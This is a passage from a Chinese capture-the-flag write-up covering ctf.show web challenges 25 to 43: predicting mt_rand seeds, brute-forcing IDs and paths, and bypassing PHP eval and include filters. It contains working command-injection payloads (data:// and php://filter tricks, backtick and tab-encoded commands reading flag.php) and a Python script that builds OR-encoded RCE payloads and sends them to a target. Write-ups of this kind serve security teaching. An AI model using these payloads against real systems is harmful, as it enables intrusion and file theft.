+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">4188754181</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$result = mt_rand()+mt_rand();</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/LH_7%246BHAF3_G2K%24SH7_240.png" alt=""><br>
+得到token的值为2504830688</p>
+<blockquote>
+<p>所以开始构造<br>
+第一个，构造?r=86715576，使得$rang=0，满足if((!$rand))，进入下一层if判断token的值<br>
+第二个，构造cookie头里的token=2504830688</p>
+</blockquote>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_LWI%60Z57MJJ6T~63%25%28%29F4Z5.png" alt=""><br>
+成功拿到flag</p>
+<h3 id="web26"><a class="header-anchor" href="#web26">¶</a>web26</h3>
+<p>打开页面，看到一个网站<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/1XQD%5DP2%29%60E%24E61~M4R5D%25%5BT.png" alt=""><br>
+右键查看源码，发现存在一个checkdb.php<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/P%7BD~2I33%245_RB%25ZPCX8%60L%60E.png" alt=""><br>
+照这个格式post发送数据，得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web26/V0HXO4ABATGZ%7DPSLWUN969R.png" alt=""></p>
+<h3 id="web27"><a class="header-anchor" href="#web27">¶</a>web27</h3>
+<p>打开依然是一个cms<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/BP6EY%25%258HNQ%25QSL_HNCTKGH.png" alt=""><br>
+点击录取名单，下载得到一份名单<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/813HRBR%251X85L42%28FAI%298N3.png" alt=""><br>
+发现身份证中间少了日期，继续回到页面，点击查询系统<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/AKL~%60%24QE%7DN%28F9E12TH%28IF03.png" alt=""><br>
+需要输入姓名和身份证，我们现在有了姓名，身份证模糊，那进行抓包爆破<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/L%7D%28%25%40L7MXJ%40%60L%60ZE6ELV7OC.png" alt=""><br>
+设置一下爆破身份证中的日期<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/3328122SZ%5DDZ1A%283D9T1%290S.png" alt=""><br>
+爆破结果<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/9STH6184%7DTQ%60%5DJTBMYXLM%40R.png" alt=""><br>
+解码一下<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/J%5D4371%5D%28~B5%29O4%5D%4070%5B%28V%7BH.png" alt=""><br>
+得到身份证号和学号，然后去首页登录一下，得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web27/HP%7B%29%24%246%28%29%40%5D80BW%7B%25BRO%5DFC.png" alt=""></p>
+<h3 id="web28"><a class="header-anchor" href="#web28">¶</a>web28</h3>
+<p>打开页面，没发现什么有用的信息，但是观察到url有些奇怪<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/R%7DN~3OR%24%29AYK3ZR%40KE_%28Z%24Y.png" alt=""><br>
+应该是爆破目录，抓包一下<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/L%7BZ%25%5BNXER14_RH%7DI~K7I%40EP.png" alt=""><br>
+两个payload都选择0到100进行爆破<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/F%28_C2B6B%60Q%24%25N~8VF%7BCZ~%258.png" alt=""><br>
+在爆破结果中得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web28/%5D3HMWR%29%7B%60I%60V8~D~987Z5WS.png" alt=""></p>
+<h2 id="命令执行-29-124"><a class="header-anchor" href="#命令执行-29-124">¶</a>命令执行(29-124)</h2>
+<h3 id="web29"><a class="header-anchor" href="#web29">¶</a>web29</h3>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先先system(“ls”);查看一下文件<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/K%24S4PZ%5BAUUD6HI4V3BU%24%5BAW.png" alt=""><br>
+既然过滤了flag，那我们就fla*的形式进行匹配，结合tac命令输出flag.php文件内容<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/PSF%24%29E%25DF_X2Q5%7DKHS%60%7DEVR.png" alt=""></p>
+<h3 id="web30"><a class="header-anchor" href="#web30">¶</a>web30</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里把system命令给过滤了，不过有别的姿势，例如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac *&#96;;</span><br></pre></td></tr></table></figure>
+<p>还是使用通配符进行匹配，不过换了echo进行输出<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web30/DY%28YYO%60%7DR_2%293%60MF2J%400A51.png" alt=""></p>
+<h3 id="web31"><a class="header-anchor" href="#web31">¶</a>web31</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里开始过滤了空格，本来我是使用%20编码绕过的不知道为什么不行(有点疑惑)，然后就改用了%09</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo%09&#96;tac%09*&#96;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web31/MPL%7BFEDQ%40VS%28C%5DK%24%60IZPGX3.png" alt=""></p>
+<h3 id="web32"><a class="header-anchor" href="#web32">¶</a>web32</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次把反引号和echo都过滤了，不过还有新姿势，利用include函数(还有require也可以)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line"></span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/Z2ILTYJZF_YO%40_2%28%7BP0GY%5B2.png" alt=""><br>
+把base64解码后即可得到flag</p>
+<h3 id="web33"><a class="header-anchor" href="#web33">¶</a>web33</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次多过滤了双引号，继续使用上一题的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web34"><a class="header-anchor" href="#web34">¶</a>web34</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>多过滤一个:号，还是可以使用上一题的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web35"><a class="header-anchor" href="#web35">¶</a>web35</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>多过滤一个&lt;号和一个=号，不过没有影响，继续使用前面的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web36"><a class="header-anchor" href="#web36">¶</a>web36</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次增加过滤数字，但还是没有影响，继续使用前面payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web37"><a class="header-anchor" href="#web37">¶</a>web37</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>换新题了，这次是使用了include语句，这里过滤了flag，我们采用伪协议data的方法进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/%5DJ0%28I6%7BNZRUAD3WLGORLO%604.png" alt=""></p>
+<h3 id="web38"><a class="header-anchor" href="#web38">¶</a>web38</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次在前面基础上过滤了php和file，对我们无碍，因为我们使用的是php短标签，所以继续使用上面的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web39"><a class="header-anchor" href="#web39">¶</a>web39</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次减少了过滤，但是会再后面加上.php的后缀，然而我们前面的payload结尾是有一个?&gt;进行了标签闭合，所以?&gt;.php没有影响，继续使用前面payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web40"><a class="header-anchor" href="#web40">¶</a>web40</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里回到eval语句执行命令，但过滤了许多东西，没有过滤掉英文的()，那我们使用无参数的rce进行构造读取文件</p>
+<blockquote>
+<p>print_r(scandir(‘.’));      查看当前目录下的所有文件名</p>
+<p>localeconv() 				函数返回一包含本地数字及货币格式信息的数组。</p>
+<p>current() 					  函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</p>
+</blockquote>
+<p>我们先打印出当前目录下的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/NHDM7A4%5BNQ%5BU3%25S%401W%60%24R2P.png" alt=""><br>
+读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p>
+<blockquote>
+<p>each()        返回数组中当前的键/值对并将数组指针向前移动一步<br>
+end()          将数组的内部指针指向最后一个单元<br>
+next()         将数组中的内部指针向前移动一位<br>
+prev()         将数组中的内部指针倒回一位<br>
+array_reverse() 	以相反的元素顺序返回数组</p>
+</blockquote>
+<p>需要知识点齐了，观察flag.php在倒数第二位，我们开始构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/AKO6S7Q%24R_EJ%5B6Q13BEICQ9.png" alt=""></p>
+<h3 id="web41"><a class="header-anchor" href="#web41">¶</a>web41</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了数字和字母还有一些其他符号，但我们可以利用或运算符进行构造payload进行命令执行<br>
+思路：</p>
+<blockquote>
+<p>通俗解释：<br>
+例如源码中禁止我们使用了数字3，也就是ascii码值为51，我们可以使用或运算符在没有被禁止的字符中构造出51来，比如19和32没有被禁止，我们进行与运算19|32=51，就可以获得51这个ascii码值，也就是成功得到了数字3</p>
+</blockquote>
+<p>知道了方法后，我们从ascii码表，也就是0-255中找到没有被过滤的字符进行或运算，以寻求得到我们想要的字符<br>
+结合了yu师傅给出的exp，我们写一个可利用脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span>(len(argv)!=<span class="number">2</span>):</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    print(<span class="string">&#x27;USER:python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;eg:  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;exit: input exit in function&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成可用的字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i | j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f=open(<span class="string">&quot;rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t=f.readline()</span><br><span class="line">            <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param=action(s1) + action(s2)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>运行后，输入命令得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/%7DG%40_KOG%24CK29%60OW%5BQEF%5DQMR.png" alt=""></p>
+<h3 id="web42"><a class="header-anchor" href="#web42">¶</a>web42</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次后面多了一个&quot; &gt;/dev/null 2&gt;&amp;1&quot;语句，意思是写入的内容会永远消失，也就是不进行回显</p>
+<blockquote>
+<p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>
+2：/dev/null 代表空设备文件<br>
+3：2&gt; 表示stderr标准错误<br>
+4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>
+5：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”<br>
+因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</p>
+<p>那么本文标题的语句执行过程为：<br>
+1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。<br>
+2&gt;&amp;1 ：		接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
+</blockquote>
+<p>也就是我们如果输入<code>?c=ls</code>，输出就会被吞掉不进行回显，那该怎么办呢？其实很简单，用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔<br>
+payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac flag.php;</span><br></pre></td></tr></table></figure>
+<h3 id="web43"><a class="header-anchor" href="#web43">¶</a>web43</h3>
